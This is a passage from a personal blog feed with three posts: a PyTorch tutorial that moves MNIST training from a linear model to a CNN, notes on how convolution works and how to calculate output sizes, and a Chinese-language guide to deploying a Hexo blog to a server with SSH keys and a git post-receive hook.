class="line"></span><br></pre></td></tr></table></figure>
<p>Most of the details can be answered if you have learnt about the basic knowledge of neural network, and most of the procedures are very similar to <a href="github.com/microsoft/ai-edu">the tutorial I learn</a>.</p>
<p>Now the magic just begins.</p>
<h2 id="Where-can-be-simplified-using-PyTorch-feature"><a href="#Where-can-be-simplified-using-PyTorch-feature" class="headerlink" title="Where can be simplified using PyTorch feature?"></a>Where can be simplified using PyTorch feature?</h2><h3 id="choosing-from-torch-nn-functional"><a href="#choosing-from-torch-nn-functional" class="headerlink" title="choosing from torch.nn.functional"></a>choosing from torch.nn.functional</h3><p>In previous code, we must manually define a function <code>nll</code> for calculating loss, which can be replaced by <code>torch.nn.functional</code>.</p>
<p>This stuff contains lots of functions, so that we needn’t implement each function we use, which is quite convenient.</p>
<h2 id="extending-torch-nn-Module"><a href="#extending-torch-nn-Module" class="headerlink" title="extending torch.nn.Module"></a>extending torch.nn.Module</h2><p>we can define our whole neural network as a class, whose super class is <code>torch.nn.Module</code>. In this way, parameters can be stored inside this object, which is friendly for us to program.</p>
<h2 id="using-layer-objects-from-torch-nn"><a href="#using-layer-objects-from-torch-nn" class="headerlink" title="using layer objects from torch.nn"></a>using layer objects from torch.nn</h2><p>The model previous code uses is exactly a linear layer, which can be replaced by <code>torch.nn.Linear</code>, which contains parameters within it.</p>
<p>What’s more, pooling layer, convolution layer are also available to use in <code>torch.nn</code>, which greatly reduces workflow.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">loss_func = F.cross_entropy</span><br><span class="line">model = NeuralNet() <span class="comment"># I am hanhan!</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">max_epoch, max_iteration, batch_size, lr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        <span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(max_iteration):</span><br><span class="line">            batch_x, batch_y = get_batch_train_data(batch_size, iteration)</span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line"></span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters():</span><br><span class="line">                    p -= p.grad * lr</span><br><span class="line">                model.zero_grad()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = model(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="modifying-parameters-by-torch-optim"><a href="#modifying-parameters-by-torch-optim" class="headerlink" title="modifying parameters by torch.optim"></a>modifying parameters by torch.optim</h2><p><code>torch.optim</code> includes many methods of optimization, including most commonly-used SGD. With this tool, we needn’t traverse all parameters and subtract its specific value from itself, but only write two lines of code:</p>
<p>Before:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters():</span><br><span class="line">        p -= p.grad * lr</span><br><span class="line">    model.zero_grad()</span><br></pre></td></tr></table></figure><br>After:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    optimizer.step()</span><br><span class="line">    optimizer.zero_grad()</span><br></pre></td></tr></table></figure><br>Remember to zero grad after each epoch is done, otherwise the gradients will become way too large and get unexpected results.</p>
<p>btw, why I comment that I am hanhan? Because I made mistake on <code>model</code>. Here <code>model</code> must be an instance of <code>NeuralNet</code> rather than a alias, for the values of weights are random. Otherwise, your loss value will always get above 2…</p>
<h3 id="loading-dataset-and-dataloader"><a href="#loading-dataset-and-dataloader" class="headerlink" title="loading dataset and dataloader"></a>loading dataset and dataloader</h3><p>How to import?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> TensorDataset, DataLoader</span><br></pre></td></tr></table></figure>
<p>How to declare?<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_set = TensorDataset(XTrain, YTrain)</span><br><span class="line">train_loader = DataLoader(train_set, batch_size=bs, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_set = TensorDataset(XValid, YValid)</span><br><span class="line">valid_loader = DataLoader(valid_set, batch_size=bs * <span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><br>Where is the validation set? I just generate the validation set by extracting one tenth of data of training set. This trick is learnt from “microsoft/ai-edu”.</p>
<p>Since we have things prepared, the whole training code is simple:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        model.train() <span class="comment"># written before training</span></span><br><span class="line">        <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> train_loader: <span class="comment"># traversal simplified</span></span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">        model.<span class="built_in">eval</span>() <span class="comment"># written before validating</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            valid_loss = <span class="built_in">sum</span>(loss_func(model(batch_x), batch_y) <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> valid_loader) / num_valid</span><br><span class="line">        print(<span class="string">&quot;epoch %d, validation loss=%.4f&quot;</span> % (epoch, valid_loss))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Switch-to-CNN"><a href="#Switch-to-CNN" class="headerlink" title="Switch to CNN"></a>Switch to CNN</h2><p>CNN is widely used when data is images. Now let’s try to solve MNIST with CNN, just to feel how powerful CNN is.</p>
<p>In fact, most of the code remain the same. The only area we need to modify is in the definition of class, replacing linear layer with more complex layers.</p>
<p>Here is the code:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn, optim</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> TensorDataset, DataLoader</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># class MNIST(nn.Module):</span></span><br><span class="line"><span class="comment">#     def __init__(self):</span></span><br><span class="line"><span class="comment">#         super(MNIST, self).__init__()</span></span><br><span class="line"><span class="comment">#         self.conv1 = nn.Conv2d(1, 16, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#         self.conv2 = nn.Conv2d(16, 16, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#         self.conv3 = nn.Conv2d(16, 10, kernel_size=3, stride=2, padding=1)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     def forward(self, batch_x):</span></span><br><span class="line"><span class="comment">#         batch_x = batch_x.view(-1, 1, 28, 28)</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv1(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv2(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.relu(self.conv3(batch_x))</span></span><br><span class="line"><span class="comment">#         batch_x = F.avg_pool2d(batch_x, 4)</span></span><br><span class="line"><span class="comment">#         return batch_x.view(-1, batch_x.size(1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">X</span>):</span></span><br><span class="line">    print(X.shape)</span><br><span class="line">    plt.imshow(X.reshape((<span class="number">28</span>, <span class="number">28</span>)), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_validation_set</span>(<span class="params">k=<span class="number">10</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> num_train, XTrain, YTrain</span><br><span class="line">    num_valid = num_train // k</span><br><span class="line">    num_train -= num_valid</span><br><span class="line">    XValid, YValid = XTrain[:num_valid], YTrain[:num_valid]</span><br><span class="line">    XTrain, YTrain = XTrain[num_valid:], YTrain[num_valid:]</span><br><span class="line">    <span class="keyword">return</span> XValid, YValid, num_valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XTrain, YTrain, XTest, YTest = read_data()  <span class="comment"># train: 50000, test: 10000</span></span><br><span class="line">num_train = XTrain.shape[<span class="number">0</span>]</span><br><span class="line">num_test = XTest.shape[<span class="number">0</span>]</span><br><span class="line">XValid, YValid, num_valid = generate_validation_set(k=<span class="number">10</span>)</span><br><span class="line">XTrain, YTrain, XValid, YValid, XTest, YTest = <span class="built_in">map</span>(torch.tensor, (XTrain, YTrain, XValid, YValid, XTest, YTest))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accuracy</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    temp = torch.argmax(batch_z, dim=<span class="number">1</span>)</span><br><span class="line">    r = (temp == batch_y)</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">float</span>().mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lambda</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, func</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Lambda, self).__init__()</span><br><span class="line">        self.func = func</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.func(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hyper-parameter</span></span><br><span class="line">bs = <span class="number">64</span></span><br><span class="line">lr = <span class="number">0.1</span></span><br><span class="line">momentum = <span class="number">0.9</span></span><br><span class="line">max_epoch = <span class="number">20</span></span><br><span class="line"><span class="comment"># essential stuff</span></span><br><span class="line">loss_func = F.cross_entropy</span><br><span class="line"><span class="comment"># model = MNIST()</span></span><br><span class="line">model = nn.Sequential(</span><br><span class="line">    Lambda(<span class="keyword">lambda</span> x: x.view(-<span class="number">1</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>)),</span><br><span class="line">    nn.Conv2d(<span class="number">1</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">16</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">16</span>, <span class="number">10</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.AvgPool2d(<span class="number">4</span>),</span><br><span class="line">    Lambda(<span class="keyword">lambda</span> x: x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)),</span><br><span class="line">)</span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> relu is different in these two forms!(F.relu vs nn.ReLU)</span></span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=lr, momentum=momentum)</span><br><span class="line"><span class="comment"># datasets and dataloaders</span></span><br><span class="line">train_set = TensorDataset(XTrain, YTrain)</span><br><span class="line">train_loader = DataLoader(train_set, batch_size=bs, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_set = TensorDataset(XValid, YValid)</span><br><span class="line">valid_loader = DataLoader(valid_set, batch_size=bs * <span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        model.train()</span><br><span class="line">        <span class="comment"># training: using training set</span></span><br><span class="line">        <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> train_loader:</span><br><span class="line">            <span class="comment"># forward</span></span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            <span class="comment"># backward</span></span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">        model.<span class="built_in">eval</span>()</span><br><span class="line">        <span class="comment"># inference: using validation set</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            valid_loss = <span class="built_in">sum</span>(loss_func(model(batch_x), batch_y) <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> valid_loader) / num_valid</span><br><span class="line">        print(<span class="string">&quot;epoch %d, validation loss=%.4f&quot;</span> % (epoch, valid_loss))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = model(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train()</span><br><span class="line">test()</span><br></pre></td></tr></table></figure></p>
<h2 id="Result-Comparision"><a href="#Result-Comparision" class="headerlink" title="Result Comparision"></a>Result Comparision</h2><h3 id="Linear"><a href="#Linear" class="headerlink" title="Linear"></a>Linear</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">training...</span><br><span class="line">epoch 0, validation loss&#x3D;0.0032</span><br><span class="line">epoch 1, validation loss&#x3D;0.0028</span><br><span class="line">epoch 2, validation loss&#x3D;0.0026</span><br><span class="line">epoch 3, validation loss&#x3D;0.0025</span><br><span class="line">epoch 4, validation loss&#x3D;0.0024</span><br><span class="line">epoch 5, validation loss&#x3D;0.0024</span><br><span class="line">epoch 6, validation loss&#x3D;0.0023</span><br><span class="line">epoch 7, validation loss&#x3D;0.0023</span><br><span class="line">epoch 8, validation loss&#x3D;0.0023</span><br><span class="line">epoch 9, validation loss&#x3D;0.0022</span><br><span class="line">epoch 10, validation loss&#x3D;0.0022</span><br><span class="line">epoch 11, validation loss&#x3D;0.0022</span><br><span class="line">epoch 12, validation loss&#x3D;0.0022</span><br><span class="line">epoch 13, validation loss&#x3D;0.0022</span><br><span class="line">epoch 14, validation loss&#x3D;0.0022</span><br><span class="line">epoch 15, validation loss&#x3D;0.0022</span><br><span class="line">epoch 16, validation loss&#x3D;0.0022</span><br><span class="line">epoch 17, validation loss&#x3D;0.0021</span><br><span class="line">epoch 18, validation loss&#x3D;0.0022</span><br><span class="line">epoch 19, validation loss&#x3D;0.0021</span><br><span class="line">training done.</span><br><span class="line">testing...</span><br><span class="line">loss&#x3D;0.2707, accuracy&#x3D;0.9251</span><br><span class="line">testing done.</span><br></pre></td></tr></table></figure>
<h3 id="CNN"><a href="#CNN" class="headerlink" title="CNN"></a>CNN</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">training...</span><br><span class="line">epoch 0, validation loss&#x3D;0.0042</span><br><span class="line">epoch 1, validation loss&#x3D;0.0020</span><br><span class="line">epoch 2, validation loss&#x3D;0.0018</span><br><span class="line">epoch 3, validation loss&#x3D;0.0017</span><br><span class="line">epoch 4, validation loss&#x3D;0.0015</span><br><span class="line">epoch 5, validation loss&#x3D;0.0012</span><br><span class="line">epoch 6, validation loss&#x3D;0.0015</span><br><span class="line">epoch 7, validation loss&#x3D;0.0013</span><br><span class="line">epoch 8, validation loss&#x3D;0.0012</span><br><span class="line">epoch 9, validation loss&#x3D;0.0011</span><br><span class="line">epoch 10, validation loss&#x3D;0.0011</span><br><span class="line">epoch 11, validation loss&#x3D;0.0012</span><br><span class="line">epoch 12, validation loss&#x3D;0.0011</span><br><span class="line">epoch 13, validation loss&#x3D;0.0013</span><br><span class="line">epoch 14, validation loss&#x3D;0.0010</span><br><span class="line">epoch 15, validation loss&#x3D;0.0010</span><br><span class="line">epoch 16, validation loss&#x3D;0.0010</span><br><span class="line">epoch 17, validation loss&#x3D;0.0010</span><br><span class="line">epoch 18, validation loss&#x3D;0.0010</span><br><span class="line">epoch 19, validation loss&#x3D;0.0009</span><br><span class="line">training done.</span><br><span class="line">testing...</span><br><span class="line">loss&#x3D;0.1135, accuracy&#x3D;0.9666</span><br><span class="line">testing done.</span><br></pre></td></tr></table></figure>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Life is short, I use PyTorch.</p>
<p>CNN, yyds!</p>
]]></content>
      <tags>
        <tag>Deep-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Convolution Neural Network Learning Notes</title>
    <url>/2021/01/25/Convolution-Neural-Network-Learning-Notes/</url>
    <content><![CDATA[<h2 id="Definition-of-Convolution-Neural-Network"><a href="#Definition-of-Convolution-Neural-Network" class="headerlink" title="Definition of Convolution Neural Network"></a>Definition of Convolution Neural Network</h2><p>Definition in Discrete Mathematics:</p>
<script type="math/tex; mode=display">h(x) = (f*g)(x) = \sum_{t=-\infty}^{\infty} f(t)g(x-t)</script><p>Two-dimensional Definition(I: image, K: kernal, cross-correlation):</p>
<script type="math/tex; mode=display">h(i,j) = (I*K)(i,j) = \sum_m \sum_n I(i-m,j-n)K(m,n)</script><p>However, our convolution here does not reverse kernal, which means actually:</p>
<script type="math/tex; mode=display">h(i,j) = (I*K)(i,j) = \sum_m \sum_n I(i+m,j+n)K(m,n)</script><p>Without reversed kernal, the operation is exactly the matrix dot multiplication.</p>
<h2 id="Relevant-Concepts"><a href="#Relevant-Concepts" class="headerlink" title="Relevant Concepts"></a>Relevant Concepts</h2><p>A kernal is a square matrix responsible for extracting a feature from input. When using multiple kernal, we can extract multiple features from the same picture sample.</p>
<p>The size of kernal is commonly an odd number, and especially there exists 1*1 kernal.</p>
<p>The set of convolution kernals is called Filter. The number of kernal in a filter is usually euqal to that of input channels. For example, when processing RGB pictures, we usually use three kernals to calculate with corresponding channels, and these three kernals can be included in a filter.</p>
<p>Similarly with neural network learnt before, there is a bias corresponding with each filter, whose size is the same as the output size of the filter.</p>
<p>Several filters and their corresponding bias matrices consist of a WeightsBias.</p>
<p>Stride is a parameter of a convolution layer, which stands for the increment of coordination of width and height after each update is done. By default the stride is set 1. Obviously, the bigger the stride, the smaller the output size.</p>
<p>Padding is used when we want to control the output size. When padding is needed, we will add several layer of zeros on the edge of original matrix, thus incrementing the size. By default the padding is 0. On the contrary, the bigger the padding, the bigger the output size.</p>
<h2 id="Size-Calculation"><a href="#Size-Calculation" class="headerlink" title="Size Calculation"></a>Size Calculation</h2><p>Actually we can calculate the width and height of output:</p>
<script type="math/tex; mode=display">Width_{out} = \lfloor \frac{Width_{in} - Width_{K} + 2Padding}{Stride} \rfloor + 1</script><script type="math/tex; mode=display">Height_{out} = \lfloor \frac{Height_{in} - Height_{K} + 2Padding}{Stride} \rfloor+ 1</script><h2 id="About-PyTorch"><a href="#About-PyTorch" class="headerlink" title="About PyTorch"></a>About PyTorch</h2><p>When retrieving data from the dataloader previously loaded, the dimension of the input tensor is 4, respectively:</p>
<ol>
<li>batch size: int, one part of hyper-parameter</li>
<li>input channels: int, the number of channels of data(gray-scale: 1, RGB: 3)</li>
<li>width: int, consistent with dataset</li>
<li>height: int, consistent with dataset</li>
</ol>
<p>The number of first dimension remains unchanged during the whole forward process. However, input channels will be changed according to our design of convolution layers. Width and height can be calculated by applying the formulas above.</p>
<p>When <code>LayerChoice</code> and <code>InputChoice</code> are used in definition of model, we must guarantee each calculation is meaningful rather than size dismatched.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice(OrderedDict([</span><br><span class="line">            (<span class="string">&quot;conv3*3&quot;</span>, nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>)),</span><br><span class="line">            (<span class="string">&quot;conv5*5&quot;</span>, nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>))</span><br><span class="line">        ]), key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&quot;skip_conv&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        old_x = x</span><br><span class="line">        zero_x = torch.zeros_like(old_x)</span><br><span class="line">        skip_x = self.input_switch([zero_x, old_x])</span><br><span class="line">        x = F.relu(self.mid_conv(x))</span><br><span class="line">        x += skip_x</span><br><span class="line">        x = self.pool(F.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>In this example, dataset is CIFAR-10, where all samples are 32*32.</p>
<p>When<code>x = self.conv1(x)</code>, now the size may be 30 or 28. After 2*2 pooling, the size(width and height) may be 15 or 14.</p>
<p>Here we must make the size unchanged after <code>x = self.mid_conv(x)</code> since it is a layer allowed to be skipped. And we can see when kernal size is 3, padding is 1 and kernal size equals 5, padding euqals 2, width and height both remain unchanged.</p>
<p>After <code>x = self.conv2(x)</code>, the size shrinks to 10 or 11. After max-pooling, the size becomes 5 as expected.</p>
]]></content>
      <tags>
        <tag>Deep-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>My Hexo Blog Configuration</title>
    <url>/2021/01/08/My-Hexo-Blog-Configuration/</url>
    <content><![CDATA[<p>芜湖！起飞！今天备案终于审核通过了！捣鼓了一下，终于把博客弄得像模像样的，就顺带记录一下！</p>
<h2 id="序幕"><a href="#序幕" class="headerlink" title="序幕"></a>序幕</h2><p>军训汇操在早上结束了，回到宿舍一打开手机就连收到三条信息，终于给爷备案好了！</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221637.jpg">
<img data-src="http://qiniu.garen-wang.cn/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221657.jpg">
<p>我啪的一下就开始准备我的博客了，很快啊！</p>
<h2 id="博客框架"><a href="#博客框架" class="headerlink" title="博客框架"></a>博客框架</h2><p>博客使用Hexo搭建，用了NexT主题(NexT.Gemini)，在GitHub上就能找到这个主题。</p>
<p>Hexo只要有npm就可以安装了，跑条命令安装一下就行。</p>
<p>Hexo的操作可以直接看官方文档，也很容易懂，这里不赘述。</p>
<p>GitHub Pages之前就配置好了，现在主要是需要配置到我的服务器上面去。</p>
<h2 id="Hexo同步至服务器"><a href="#Hexo同步至服务器" class="headerlink" title="Hexo同步至服务器"></a>Hexo同步至服务器</h2><p>首先，在服务器上面安装一下git和nginx。在备案没有成功的时候，可以直接用买服务器时给的弹性公网IP直接去上，效果是一样的。</p>
<p>按照我的印象，当没有安装nginx时，在浏览器中输入ip打开，是会出现小恐龙的，而安装了nginx之后就成了404。这说明nginx确实已经开始起作用了，安装正常。</p>
<p>然后可以在服务器那端用ssh免密登录，粗略流程是这样的：</p>
<ol>
<li>在本机用<code>ssh-keygen</code>创建一个ssh公钥和私钥。</li>
<li>在服务器的<code>.ssh</code>目录创建一个<code>authorized_keys</code>，再<code>chmod</code>一下。</li>
<li>把ssh公钥写到<code>authorized_keys</code>上面去。</li>
</ol>
<p>这个时候，只要本机有私钥，服务器有公钥，我们就可以通过一个ssh命令免密远程登录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh root@&quot;your_ip&quot;</span><br></pre></td></tr></table></figure>
<p>之后创建<code>/var/repo</code>文件夹，在里面新建一个叫blog的git仓库，新建命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init --bare blog.git</span><br></pre></td></tr></table></figure>
<p>之后，打开<code>blog.git/hooks/post-receive</code>，<code>chmod</code>一下，同时添加下列内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">git --work-tree&#x3D;&#x2F;var&#x2F;www&#x2F;hexo --git-dir&#x3D;&#x2F;var&#x2F;repo&#x2F;blog.git checkout -f</span><br></pre></td></tr></table></figure>
<p>之后，在<code>var/www/hexo</code>处创建好文件夹，<code>chmod</code>一下，这样之后，服务器端的设置就完成了。</p>
<p>最终我们想要的是：在本机输入<code>hexo d</code>时，能部署到服务器上，这时需要在根目录下的<code>_config.yml</code>下修改：</p>
<h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;example.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: https:&#x2F;&#x2F;your_ip</span><br></pre></td></tr></table></figure>
<h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  - type: git</span><br><span class="line">    repo: git@github.com:Garen-Wang&#x2F;garen-wang.github.io.git</span><br><span class="line">    branch: master</span><br><span class="line">  - type: git</span><br><span class="line">    repo: root@your_ip:&#x2F;var&#x2F;repo&#x2F;blog.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure>
<p>这样就应该能把hexo部署到你的服务器上面去了。</p>
